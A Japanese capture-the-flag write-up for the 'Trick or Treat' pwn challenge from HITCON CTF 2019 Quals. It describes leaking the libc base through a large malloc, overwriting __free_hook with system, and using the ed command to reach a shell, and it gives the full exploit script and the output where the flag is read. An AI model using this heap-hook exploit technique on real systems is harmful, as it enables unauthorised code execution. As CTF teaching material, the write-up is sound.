# [pwn 234pts] Trick or Treat - HITCON CTF 2019 Quals
64ビットでいろいろ有効です。
```
$ checksec -f trick_or_treat
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No      0               1       trick_or_treat
```

最初に任意サイズでmallocでき、そこで得られたアドレスから指定のオフセットだけ離れた場所に2回qwordを書き込めます。mallocされたアドレスは貰えます。
とりあえずlibc leakが無いと始まらないのでmallocで巨大チャンクを確保し、libcのアドレスを取得します。（隣接するので）
あとは`__malloc_hook`をone gadgetに書き換えてscanfに大量の入力を入れれば終わり！と思ったのですが、どのone gadgetも動きませんでした。

`__free_hook`でもone gadgetは動かず、最初はexitを使う方法を考えたのですが、よくみたら`exit`じゃなくて`_exit`が呼ばれていました。scanfのコード読んで抜け穴が無いかとかいろいろ調べたんですが、結果として`__free_hook`を`system`に変更する方向で落ち着きました。
scanfでは`%lx`を読んでいるので`[0-9a-fA-F\+\-]+`みたいなデータしか読んでくれません。そこで`/bin`にhexで表記できる便利なコマンドが無いか調べた結果、`ed`コマンドを見つけました。
edといえば`/bin/sh`を起動できることで有名なので、これを使います。
```python
from ptrlib import *

def offset(addr):
    return (addr - ptr) // 8

libc = ELF("./libc.so.6")
#sock = Process("./trick_or_treat")
sock = Socket("3.112.41.140", 56746)

# leak libc base
payload = "9" * 8
sock.sendlineafter(":", payload)
sock.recvuntil(":")
ptr = int(sock.recvline(), 16)
libc_base = ptr - 0x10 + 0x5f5f000
logger.info("libc base = " + hex(libc_base))

# overwrite __free_hook
payload  = hex(offset(libc_base + libc.symbol("__free_hook")))[2:]
payload += " "
payload += hex(libc_base + libc.symbol("system"))[2:]
sock.sendlineafter(":", payload)

# get the shell!
payload  = "1" + "a"
payload += "a" * (0x800 - len(payload))
sock.sendlineafter(":", payload + " ed")
sock.sendline("!/bin/sh")

sock.interactive()
```

いぇい。
```
$ python solve.py 
[+] __init__: Successfully connected to 3.112.41.140:56746
[+] <module>: libc base = 0x7f5d130ea000
[ptrlib]$ cat /home/trick_or_treat/flag
hitcon{T1is_i5_th3_c4ndy_for_yoU}
[ptrlib]$
```

# 感想
めちゃ面白かったです。HITCON真面目に参加しとけばよかった。
